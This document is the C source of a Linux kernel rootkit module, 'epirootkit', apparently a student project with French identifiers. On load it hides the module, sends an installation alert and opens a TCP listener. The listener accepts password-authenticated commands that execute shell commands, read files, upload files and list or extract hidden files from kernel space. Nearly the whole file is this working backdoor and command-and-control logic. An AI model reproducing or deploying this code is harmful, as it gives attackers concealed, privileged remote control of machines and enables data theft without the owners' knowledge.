#include "epirootkit.h"
#include "auth.h"
#include "cache.h"
#include "commandes.h"
#include "dissimulation.h"
#include "notification.h"
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Etudiant");
MODULE_DESCRIPTION("Module Noyau Cache");
MODULE_VERSION("0.1");

struct socket *sockfd;
struct task_struct *tache_serveur;

int creer_serveur(void *arg)
{
    struct socket *sock_client;
    int err;
    
    allow_signal(SIGKILL);
    
    while (!kthread_should_stop()) {
        err = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock_client);
        if (err < 0)
            continue;
            
        err = kernel_accept(sockfd, &sock_client, 0);
        if (err < 0) {
            sock_release(sock_client);
            continue;
        }
        
        traiter_connexion(sock_client);
        sock_release(sock_client);
        
        if (signal_pending(current))
            break;
            
        schedule();
    }
    
    return 0;
}

int traiter_connexion(struct socket *sock_client)
{
    char *buffer_reception;
    char *buffer_reponse;
    int taille_recue;
    struct msghdr msg;
    struct kvec iov;
    int err;
    bool connexion_authentifiee = false;
    
    buffer_reception = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
    if (!buffer_reception)
        return -ENOMEM;
    
    memset(&msg, 0, sizeof(msg));
    memset(buffer_reception, 0, TAILLE_BUFFER);
    
    iov.iov_base = "AUTH_REQUIRED";
    iov.iov_len = 13;
    kernel_sendmsg(sock_client, &msg, &iov, 1, 13);
    
    memset(buffer_reception, 0, TAILLE_BUFFER);
    iov.iov_base = buffer_reception;
    iov.iov_len = TAILLE_BUFFER - 1;
    taille_recue = kernel_recvmsg(sock_client, &msg, &iov, 1, TAILLE_BUFFER - 1, 0);
    
    if (taille_recue <= 0) {
        kfree(buffer_reception);
        return taille_recue;
    }
    
    buffer_reception[taille_recue] = '\0';
    
    if (strncmp(buffer_reception, "AUTH ", 5) == 0) {
        if (verifier_mot_de_passe(buffer_reception + 5)) {
            connexion_authentifiee = true;
            iov.iov_base = "AUTH_OK";
            iov.iov_len = 7;
            kernel_sendmsg(sock_client, &msg, &iov, 1, 7);
            pr_info("epirootkit: Authentification reussie\n");
        } else {
            iov.iov_base = "AUTH_FAILED";
            iov.iov_len = 11;
            kernel_sendmsg(sock_client, &msg, &iov, 1, 11);
            pr_info("epirootkit: Tentative d'authentification echouee\n");
            kfree(buffer_reception);
            return -1;
        }
    } else {
        iov.iov_base = "AUTH_INVALID";
        iov.iov_len = 12;
        kernel_sendmsg(sock_client, &msg, &iov, 1, 12);
        kfree(buffer_reception);
        return -1;
    }
    
    if (!connexion_authentifiee) {
        kfree(buffer_reception);
        return -1;
    }
    
    memset(buffer_reception, 0, TAILLE_BUFFER);
    iov.iov_base = buffer_reception;
    iov.iov_len = TAILLE_BUFFER - 1;
    taille_recue = kernel_recvmsg(sock_client, &msg, &iov, 1, TAILLE_BUFFER - 1, 0);
    
    if (taille_recue <= 0) {
        kfree(buffer_reception);
        return taille_recue;
    }
    
    buffer_reception[taille_recue] = '\0';
    
    if (strncmp(buffer_reception, "EXEC ", 5) == 0) {
        buffer_reponse = executer_commande(buffer_reception + 5);
    } else if (strncmp(buffer_reception, "LIRE ", 5) == 0) {
        buffer_reponse = lire_fichier(buffer_reception + 5);
    } else if (strncmp(buffer_reception, "UPLOAD ", 7) == 0) {
        char *nom_fichier = kmalloc(256, GFP_KERNEL);
        char *methode = kmalloc(32, GFP_KERNEL);
        char *chemin = kmalloc(256, GFP_KERNEL);
        
        if (!nom_fichier || !methode || !chemin) {
            if (nom_fichier) kfree(nom_fichier);
            if (methode) kfree(methode);
            if (chemin) kfree(chemin);
            buffer_reponse = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
            if (buffer_reponse)
                strcpy(buffer_reponse, "Erreur: allocation memoire");
        } else {
            memset(chemin, 0, 256);
            if (sscanf(buffer_reception + 7, "%255s %31s %255s", nom_fichier, methode, chemin) < 2) {
                buffer_reponse = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
                if (buffer_reponse)
                    strcpy(buffer_reponse, "Erreur: format invalide. Utilisez: UPLOAD nom_fichier methode [chemin]");
            } else {
                iov.iov_base = "PRET";
                iov.iov_len = 4;
                kernel_sendmsg(sock_client, &msg, &iov, 1, 4);
                
                recevoir_fichier(sock_client, nom_fichier, methode, chemin);
                kfree(nom_fichier);
                kfree(methode);
                kfree(chemin);
                kfree(buffer_reception);
                return 0;
            }
            kfree(nom_fichier);
            kfree(methode);
            kfree(chemin);
        }
    } else if (strncmp(buffer_reception, "FICHIERS", 8) == 0) {
        buffer_reponse = lister_fichiers_caches();
    } else if (strncmp(buffer_reception, "EXTRAIT ", 8) == 0) {
        buffer_reponse = extraire_fichier_cache(buffer_reception + 8);
    } else {
        buffer_reponse = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
        if (buffer_reponse)
            strcpy(buffer_reponse, "Commande non reconnue");
    }
    
    if (buffer_reponse) {
        iov.iov_base = buffer_reponse;
        iov.iov_len = strlen(buffer_reponse);
        err = kernel_sendmsg(sock_client, &msg, &iov, 1, strlen(buffer_reponse));
        kfree(buffer_reponse);
    }
    
    kfree(buffer_reception);
    return 0;
}

static int __init epirootkit_init(void)
{
    int err;
    struct sockaddr_in serveur_adresse;
    
    pr_info("epirootkit: Initialisation du module\n");
    
    err = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sockfd);
    if (err < 0) {
        pr_err("epirootkit: Impossible de creer le socket: %d\n", err);
        return err;
    }
    
    memset(&serveur_adresse, 0, sizeof(serveur_adresse));
    serveur_adresse.sin_family = AF_INET;
    serveur_adresse.sin_port = htons(PORT_CONTROLE);
    serveur_adresse.sin_addr.s_addr = INADDR_ANY;
    
    err = kernel_bind(sockfd, (struct sockaddr *)&serveur_adresse, sizeof(serveur_adresse));
    if (err < 0) {
        pr_err("epirootkit: Impossible de lier le socket: %d\n", err);
        sock_release(sockfd);
        return err;
    }
    
    err = kernel_listen(sockfd, 5);
    if (err < 0) {
        pr_err("epirootkit: Impossible de mettre le socket en ecoute: %d\n", err);
        sock_release(sockfd);
        return err;
    }
    
    tache_serveur = kthread_run(creer_serveur, NULL, "kserveur");
    if (IS_ERR(tache_serveur)) {
        err = PTR_ERR(tache_serveur);
        pr_err("epirootkit: Impossible de creer le thread serveur: %d\n", err);
        sock_release(sockfd);
        return err;
    }
    
    cacher_module();
    envoyer_alerte_installation();
    pr_info("epirootkit: Module initialise avec succes\n");
    
    return 0;
}

static void __exit epirootkit_exit(void)
{
    if (tache_serveur && !IS_ERR(tache_serveur)) {
        kthread_stop(tache_serveur);
    }
    
    if (sockfd)
        sock_release(sockfd);
    
    liberer_fichiers_caches();
    
    pr_info("epirootkit: Module supprime\n");
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);
